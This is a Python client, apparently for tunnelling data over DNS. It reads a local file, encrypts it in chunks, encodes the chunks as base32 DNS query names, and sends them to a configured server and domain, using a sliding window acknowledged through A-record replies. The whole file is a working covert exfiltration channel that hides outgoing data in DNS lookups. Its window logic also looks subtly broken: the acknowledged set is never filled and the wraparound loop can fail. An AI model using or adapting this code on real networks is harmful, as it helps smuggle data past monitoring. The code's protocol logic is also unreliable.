import time
import asyncio
from crypto_module import GCMEncryptor
from utils import encode_base32_dns_query, MAX_PAYLOAD_2DIG, DOMAIN, SERVER_IP, SERVER_PORT, WINDOW_SIZE
import dns.asyncresolver


encryptor = GCMEncryptor()
buffer = ""
with open("plaintext.txt", "r") as f:
    buffer = f.read()


# Track state
acknowledged = set()
in_flight = {}
base_seq = 0
seq_num = 0


async def send_query(seq: int, qname: str) -> int:
    resolver = dns.asyncresolver.Resolver()
    resolver.nameservers = [SERVER_IP]
    resolver.port = SERVER_PORT
    resolver.timeout = 2
    resolver.lifetime = 2
    try:
        answer = await resolver.resolve(qname, 'A')
        ip = answer[0].to_text()
        ack_seq = int(ip.split('.')[2])
        print(f"[+] Got ACK {ack_seq:02d} for SEQ {seq:02d} (IP: {ip})")
        return ack_seq
    except Exception as e:
        print(f"[!] Query failed for SEQ {seq:02d}: {e}")
        return -1


def get_chunk() -> str:
    global buffer
    chunk = buffer[:MAX_PAYLOAD_2DIG]
    buffer = buffer[MAX_PAYLOAD_2DIG:]
    return chunk


def is_in_window(ack: int, base: int) -> bool:
    if (base < (base+WINDOW_SIZE) % 100):
        return base < ack <= (base + WINDOW_SIZE) % 100
    else:
        return ack > base or ack <= (base + WINDOW_SIZE) % 100 

async def window_loop():
    global base_seq, seq_num

    while buffer or in_flight:
        tasks = []

        # Resend any unacked packets in window
        for offset in range(WINDOW_SIZE):
            current_seq = (base_seq + offset) % 100
            if current_seq in acknowledged: # already acked 
                continue
            if current_seq in in_flight: # it's going to send
                chunk = in_flight[current_seq]
            elif buffer: # add it to window
                chunk = get_chunk()
                if not chunk:
                    continue
                in_flight[current_seq] = chunk
            else:
                continue

            encrypted_chunk = encryptor.encrypt(chunk)
            qname = encode_base32_dns_query(
                encrypted_chunk, f"{current_seq}", DOMAIN)
            print(f"[>] Sending SEQ {current_seq:02d}")
            task = asyncio.create_task(send_query(current_seq, qname))
            tasks.append((current_seq, task))

        if not tasks:
            await asyncio.sleep(0.2)
            continue

        # Wait for all ACKs
        for seq, task in tasks:
            ack = await task
            if ack == -1:
                continue

            # Accept ACKs that in window
            if is_in_window(ack, base_seq):
                if (base_seq > ack ):
                    while (base_seq):
                        in_flight.pop(base_seq)
                        base_seq += 1
                        base_seq %= 100
                        print(f"[+] Sliding window: new base_seq {base_seq:02d} ack is {ack}")
                if (base_seq < ack ):      
                    while (base_seq < ack):
                        in_flight.pop(base_seq)
                        base_seq += 1
                        base_seq %= 100
                        print(f"[+] Sliding window: new base_seq {base_seq:02d} ack is {ack}")

        await asyncio.sleep(0.1)


if __name__ == '__main__':
    asyncio.run(window_loop())
    # for i in range(300):
    #     print(get_chunk(),end='')
    # while(True):
    #     asyncio.sleep(0.01)
    #     print(get_chunk())
